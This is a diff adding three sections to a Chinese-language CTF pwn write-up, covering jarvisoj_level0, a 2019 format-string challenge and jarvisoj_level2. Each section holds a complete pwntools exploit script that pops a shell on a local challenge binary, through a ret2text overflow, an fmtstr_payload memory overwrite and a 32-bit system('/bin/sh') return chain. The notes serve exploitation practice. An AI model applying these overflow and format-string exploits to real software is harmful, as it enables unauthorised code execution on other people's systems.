@@ -61,3 +61,84 @@ p.interactive()
 
 *这次学好了，先在本地创建了一个`flag.txt`的文件*
 
+## 6 jarvisoj_level0
+
+ret2text不多说了(用了下自己的模板，有很多不需要)
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+p = process('./pwn')
+#p = remote('',)
+def dbg():
+    gdb.attach(p)
+    pause()
+payload = b'a'*0x80+b'b'*0x8+p64(0x40059A)
+
+p.sendline(payload)
+
+p.interactive()
+```
+
+## 7 [第五空间2019 决赛]PWN5
+
+有一个很好用的pwntools语法：
+
+`fmtstr_payload(number,{addr:value})`
+
+- `number`表示偏移字节数，`addr`为你要写入的地址，`value`为你要更改为的数值
+
+这里分析题目可以发现，我们在buf段溢出，然后覆盖`dword_804C044`，再输入相同的覆盖值就行
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+p = process('./pwn')
+def dbg():
+    gdb.attach(p)
+    pause()
+p.recvuntil('name:')
+payload = fmtstr_payload(11,{0x804C044:0x1})
+p.sendline(payload)
+p.recvuntil('passwd:')
+p.sendline("1")
+p.interactive()
+```
+
+## 8 jarvisoj_level2
+
+一个32位的题目，和64位有些区别，但不多
+
+**32位`system（）`利用栈传参，不用寄存器**.
+
+```python
+from pwn import *
+from LibcSearcher import LibcSearcher
+from ctypes import *
+context(os='linux', arch='amd64',log_level = 'debug')
+context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
+elf = ELF("./pwn")
+#libc = ELF("./libc.so.6")
+p = process('./pwn')
+def dbg():
+    gdb.attach(p)
+    pause()
+
+sys = 0x8048320	# system的地址
+binsh = 0x804A024	#binsh的地址
+payload = b'a'*0x88+b'b'*0x4+p32(sys)+p32(1)+p32(binsh)
+#垃圾数据+覆盖返回地址(32位是4字节）+system地址调用+随意参数填充+binsh填充
+p.sendline(payload)
+p.interactive()
+```
+
